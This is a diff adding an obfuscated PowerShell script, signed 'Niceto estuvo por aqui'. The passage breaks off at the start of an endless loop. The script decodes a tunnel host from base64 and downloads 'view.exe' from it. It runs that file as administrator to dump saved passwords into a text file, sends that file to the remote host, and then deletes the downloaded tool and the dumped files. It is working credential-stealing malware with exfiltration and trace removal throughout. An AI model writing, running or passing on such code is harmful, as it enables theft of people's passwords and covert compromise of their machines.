@@ -1,0 +1,208 @@
+# ¡Niceto estuvo por aqui!
+
+$aZ1_b64 = "cm5tZ3ktMTgxLTIzMS0xNy0xNA==" # rnmgy-181-231-17-14
+$aZ1_ext_b64 = "LmEuZnJlZS5waW5nZy5saW5r" # .a.free.pinggy.link
+$aZ1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aZ1_b64)) +
+       [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aZ1_ext_b64))
+$pW2_part1_b64 = "Mzc=" # 37
+$pW2_part2_b64 = "MjA=" # 20
+$pW2_part3_b64 = "OQ==" # 9
+$pW2 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pW2_part1_b64)) +
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pW2_part2_b64)) +
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pW2_part3_b64)))
+$rFd3_part1_b64 = "L2hvbWUvbmljZXRvL2Rlc2s=" # /home/niceto/desk
+$rFd3_part2_b64 = "dG9wL3ZpZXcuZXhl" # top/view.exe
+$rFd3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rFd3_part1_b64)) +
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rFd3_part2_b64))
+$lFd4_1_part1_b64 = "QzpcVXNlcnNcJGVudjpVU0VS" # C:\Users\$env:USER
+$lFd4_1_part2_b64 = "TkFNRVx2aWV3LmV4ZQ==" # NAME\view.exe
+$lFd4_1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($lFd4_1_part1_b64)) +
+          [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($lFd4_1_part2_b64))
+$lFd4_2_part1_b64 = "QzpcVXNlcnNcJGVudjpVU0VS" # C:\Users\$env:USER
+$lFd4_2_part2_b64 = "TkFNRVx2aWV3LmNnZg==" # NAME\view.cgf
+$lFd4_2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($lFd4_2_part1_b64)) +
+          [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($lFd4_2_part2_b64))
+$a_p5_part1_b64 = "QzpcV2luZG93c1xTeXNX" # C:\Windows\SysW
+$a_p5_part2_b64 = "bzY0XHBhc2VzLnR4dA==" # OW64\pases.txt
+$a_p5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a_p5_part1_b64)) +
+         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a_p5_part2_b64))
+$a_c6_part1_b64 = "QzpcVXNlcnNcJGVudjpVU0VS" # C:\Users\$env:USER
+$a_c6_part2_b64 = "TkFNRVx2aWV3LmNnZg==" # NAME\view.cgf
+$a_c6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a_c6_part1_b64)) +
+         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a_c6_part2_b64))
+$rPp7_part1_b64 = "L2hvbWUvbmljZXRvL2Rlc2s=" # /home/niceto/desk
+$rPp7_part2_b64 = "dG9wL3Bhc2VzX3JlY2liaWRvcy50eHQ=" # top/pases_recibidos.txt
+$rPp7 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rPp7_part1_b64)) +
+         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rPp7_part2_b64))
+$dC8_part1_b64 = "REVTQ0FSR0FSIA==" # DESCARGAR
+$dC8_part2_b64 = "$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"`n\")))"
+$dC8 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($dC8_part1_b64)) +
+        " " +
+        $rFd3 +
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($dC8_part2_b64)))
+$uC9_part1_b64 = "RU5WSUFSIZ8oJGFfcDUpeyAkKCRycDcpeykg"
+$uC9_part2_b64 = "$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"`n\")))"
+$uC9 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uC9_part1_b64)) +
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uC9_part2_b64)))
+$eOF10 = [byte[]](0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00)
+$mR11 = 3
+$rI12 = 2
+
+function SenD_FiLe ($lF13, $rP14, $iP15, $poRt16) {
+    $reTry17 = 0
+    while ($reTry17 -lt $mR11) {
+        try {
+            Write-Host "Intentando enviar '$lF13' a '$($iP15):$($poRt16)' como '$rP14'..."
+            $tC18 = New-Object System.Net.Sockets."TCPClient" -ArgumentList $iP15, $poRt16
+            $nS19 = $tC18.GetStream()
+            $enCod20 = [System.Text."Encoding"]::UTF8
+
+            $uCB21_cmd = "ENVIAR $($lF13) $($rP14)`n"
+            $uCB21_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($uCB21_cmd))
+            $uCB21 = [System.Convert]::FromBase64String($uCB21_b64)
+            Write-Host "Comando de envío (UTF-8 bytes):" ($uCB21 -join ', ')
+            $nS19.Write($uCB21, 0, $uCB21.Length)
+            $nS19.Flush()
+            Write-Host "Comando de envío enviado."
+
+            $sB22_cmd = "EOF_COMMAND`n"
+            $sB22_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sB22_cmd))
+            $sB22 = [System.Convert]::FromBase64String($sB22_b64)
+            Write-Host "Separador de comando (UTF-8 bytes):" ($sB22 -join ', ')
+            $nS19.Write($sB22, 0, $sB22.Length)
+            $nS19.Flush()
+            Write-Host "Separador de comando enviado."
+
+            if (Test-Path $lF13) {
+                $fC23 = [System.IO.File]::ReadAllBytes($lF13)
+                Write-Host "Primeros 20 bytes del archivo '$lF13' (hex):" ($fC23[0..19] | ForEach-Object {$_.ToString("X2")})
+                Write-Host "Enviando $($fC23.Length) bytes del archivo '$lF13'..."
+                $nS19.Write($fC23, 0, $fC23.Length)
+                $nS19.Flush()
+                Write-Host "Archivo '$lF13' enviado."
+                $nS19.Write($eOF10, 0, $eOF10.Length)
+                $nS19.Flush()
+                Write-Host "Marcador de fin de archivo enviado."
+            } else {
+                Write-Warning "El archivo '$lF13' no existe."
+            }
+
+            $nS19.Close()
+            $tC18.Close()
+            Write-Host "Envío completado."
+            return $true
+        } catch {
+            Write-Error "Error al enviar el archivo '$lF13': $_"
+            $reTry17++
+            Write-Host "Reintentando en $rI12 segundos ($reTry17/$mR11)."
+            Start-Sleep -Seconds $rI12
+        }
+    }
+    Write-Error "No se pudo enviar el archivo '$lF13' después de $mR11 intentos."
+    return $false
+}
+
+Write-Host "Intentando descargar '$rFd3' desde '$($aZ1):$($pW2)'..."
+try {
+    $tCd24 = New-Object System.Net.Sockets."TCPClient" -ArgumentList $aZ1, $pW2
+    $nSd25 = $tCd24.GetStream()
+    $enCodD26 = [System.Text."Encoding"]::ASCII
+
+    $cB27_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($dC8))
+    $cB27 = [System.Convert]::FromBase64String($cB27_b64)
+    Write-Host "Comando de descarga (ASCII bytes):" ($cB27 -join ', ')
+    $nSd25.Write($cB27, 0, $cB27.Length)
+    $nSd25.Flush()
+    Write-Host "Comando de descarga enviado."
+
+    $fS28 = [System.IO.File]::Create($lFd4_1)
+    $buF29 = New-Object byte[] 8192
+    $rEOF30 = $false
+    while (-not $rEOF30) {
+        $bR31 = $nSd25.Read($buF29, 0, $buF29.Length)
+        if ($bR31 -gt 0) {
+            if ($bR31 -ge $eOF10.Length) {
+                for ($i = 0; $i -le ($bR31 - $eOF10.Length); $i++) {
+                    $iM32 = $true
+                    for ($j = 0; $j -lt $eOF10.Length; $j++) {
+                        if ($buF29[$i + $j] -ne $eOF10[$j]) {
+                            $iM32 = $false
+                            break
+                        }
+                    }
+                    if ($iM32) {
+                        $fS28.Write($buF29, 0, $i)
+                        $rEOF30 = $true
+                        break
+                    }
+                }
+                if (-not $rEOF30) {
+                    $fS28.Write($buF29, 0, $bR31)
+                }
+            } else {
+                $fS28.Write($buF29, 0, $bR31)
+            }
+        } else {
+            Write-Warning "Conexión TCP cerrada inesperadamente."
+            $rEOF30 = $true
+        }
+    }
+    $fS28.Close()
+    $nSd25.Close()
+    $tCd24.Close()
+    Write-Host "Descarga del archivo completada en '$lFd4_1'."
+
+    if (Test-Path $lFd4_1) {
+        Write-Host "El archivo view.exe se descargó correctamente en '$lFd4_1'."
+    } else {
+        Write-Warning "El archivo view.exe NO se descargó en '$lFd4_1'."
+        exit
+    }
+
+    Start-Sleep -Seconds 3
+
+    try {
+        $exec_path_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lFd4_1))
+        $exec_args_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("/stext $a_p5"))
+        $exec_path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($exec_path_b64))
+        $exec_args = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($exec_args_b64))
+        Write-Host "Intentando ejecutar: '$exec_path' con argumentos '$exec_args' (como administrador)..."
+        Start-Process -FilePath "$exec_path" -ArgumentList "$exec_args" -Verb RunAs -Wait -ErrorAction Stop
+        Write-Host "La ejecución de view.exe finalizó."
+    } catch {
+        Write-Error "Error al ejecutar view.exe: $_"
+    }
+
+    Start-Sleep -Seconds 6
+
+    $eE33 = SenD_FiLe $a_p5 $rPp7 $aZ1 $pW2
+
+    if ($eE33) {
+        try {
+            $rm_path1_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lFd4_1))
+            $rm_path2_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($a_p5))
+            $rm_path3_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($lFd4_2))
+            $rm_path4_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($a_c6))
+            Remove-Item -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rm_path1_b64))) -Force
+            Write-Host "Archivo local '$lFd4_1' borrado."
+            Remove-Item -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rm_path2_b64))) -Force
+            Write-Host "Archivo local '$a_p5' borrado."
+            Remove-Item -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rm_path3_b64))) -Force
+            Write-Host "Archivo local '$lFd4_2' borrado."
+            Remove-Item -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rm_path4_b64))) -Force
+            Write-Host "Archivo local '$a_c6' borrado."
+        } catch {
+            Write-Error "Error al borrar los archivos locales: $_"
+        }
+    } else {
+        Write-Warning "No se borraron los archivos porque falló el envío de '$a_p5'."
+    }
+
+} catch {
+    Write-Error "Error durante la descarga o ejecución: $_"
+}
+
+
+while (1) {
+    try {
+        $ip
